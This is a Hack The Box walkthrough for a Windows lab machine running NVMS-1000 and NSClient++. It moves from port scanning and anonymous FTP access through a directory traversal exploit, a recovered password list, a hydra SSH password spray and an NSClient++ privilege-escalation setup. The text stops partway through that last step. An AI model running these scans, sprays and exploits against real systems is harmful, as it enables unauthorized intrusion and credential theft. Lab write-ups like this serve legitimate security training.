```CSS
rustscan -a 10.10.10.184 -r 0-65535 --ulimit 5000
```
```CSS
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.184:22
Open 10.10.10.184:21
Open 10.10.10.184:80
Open 10.10.10.184:135
Open 10.10.10.184:139
Open 10.10.10.184:445
Open 10.10.10.184:6699
Open 10.10.10.184:8443
Open 10.10.10.184:49670
Open 10.10.10.184:49669
Open 10.10.10.184:49668
Open 10.10.10.184:49667
Open 10.10.10.184:49665
Open 10.10.10.184:49664
Open 10.10.10.184:49666
[~] Starting Script(s)
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-19 10:26 IST
Initiating Ping Scan at 10:26
Scanning 10.10.10.184 [2 ports]
Completed Ping Scan at 10:26, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:26
Completed Parallel DNS resolution of 1 host. at 10:26, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:26
Scanning 10.10.10.184 [15 ports]
Discovered open port 445/tcp on 10.10.10.184
Discovered open port 22/tcp on 10.10.10.184
Discovered open port 80/tcp on 10.10.10.184
Discovered open port 139/tcp on 10.10.10.184
Discovered open port 21/tcp on 10.10.10.184
Discovered open port 135/tcp on 10.10.10.184
Discovered open port 49664/tcp on 10.10.10.184
Discovered open port 6699/tcp on 10.10.10.184
Discovered open port 49669/tcp on 10.10.10.184
Discovered open port 49668/tcp on 10.10.10.184
Discovered open port 49666/tcp on 10.10.10.184
Discovered open port 49670/tcp on 10.10.10.184
Discovered open port 49665/tcp on 10.10.10.184
Discovered open port 49667/tcp on 10.10.10.184
Discovered open port 8443/tcp on 10.10.10.184
Completed Connect Scan at 10:26, 0.31s elapsed (15 total ports)
Nmap scan report for 10.10.10.184
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-09-19 10:26:35 IST for 0s

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
22/tcp    open  ssh          syn-ack
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
6699/tcp  open  napster      syn-ack
8443/tcp  open  https-alt    syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

```CSS
nmap -sC -sV 10.10.10.184 -p 21,22,80,135,445,6699,8443,49664-49670
```
```CSS
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-19 10:27 IST
Nmap scan report for 10.10.10.184
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| http-title: NSClient++
|_Requested resource was /index.html
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94%I=7%D=9/19%Time=65092A5A%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=9/19%Time=65092A63%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\
SF:x18\xd1\x03\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:
SF:\x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1
SF:\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r
SF:(RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocum
SF:ent\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Leng
SF:th:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-19T05:00:01
|_  start_date: N/A
|_clock-skew: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.05 seconds
```

FTP:21
Anonymous Authentication
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2f035b58-c3a9-4916-a41a-a6b8b6ac56f1)

File `User\Nadine\Confidential.txt`
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3e72ed0e-42bf-459f-b5df-b04d0eff3acb)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/804dd021-5bd9-4367-8eb3-c87c39c152d4)

File `User\Nathan\Notes to do.txt`
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cd8f8766-ee47-489a-84b7-28be57b8a207)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5d24a73c-3278-4454-bbfe-4ce87a4ffe86)

HTTP:80
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9e16766d-8877-4ae0-8d00-330fae6cf5fb)

HTTPS:8443
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/74a11426-fe56-4fc9-98de-881edbd35a61)

Search for Exploits
```CSS
searchsploit NVMS
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/eb2cb9e1-43a5-4dc6-9946-43b69ed0ac93)

NVMS 1000 Directory Traversal Vulnerability Exploit
```CSS
searchsploit -x hardware/webapps/47774.txt
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/419f2395-d750-40a7-882e-74351e6b7eb0)

Exploitation
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/44a63ceb-e59f-4236-8452-164ef300e2a3)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b09da494-8025-4d9c-897f-25616f36f1ce)
```CSS
Passwords:
----------
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

SSH Username and Password Spray
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/886b08d3-aef1-40f5-bf93-8c6b3efc81e8)
```CSS
hydra -L users.txt -P passwords.txt ssh://10.10.10.184
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b4fa2700-146f-4e33-b732-8635f0fbfad1)
```CSS
SSH Credentials:
----------------
nadine:L1k3B1gBut7s@W0rk
```

SSH Login
```CSS
ssh nadine@10.10.10.184
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6c90d7c4-1e86-4b71-834b-2cf12ebcb511)

Privilege Escalation
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0ba157cd-f296-41be-a2fd-513ae1508a92)

Search Exploits
```CSS
searchsploit nsclient++
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e8d0efe7-b2e5-4e04-b21e-1e97a14c99ae)

```CSS
searchsploit -x windows/local/46802.txt
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b8615c7c-382c-42e8-a1c6-afcbbd8b7a7e)

Exploit
- Grab web administrator password
```CSS
nscp.exe web -- password --display
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d239dd4c-f31a-43dc-b32d-6128c6c5e32d)
```CSS
Current password: ew2x6SsGTxjRwXOT
```
- Login and enable the `CheckExternalScripts` and `Scheduler` modules including enable at startup and save configuration
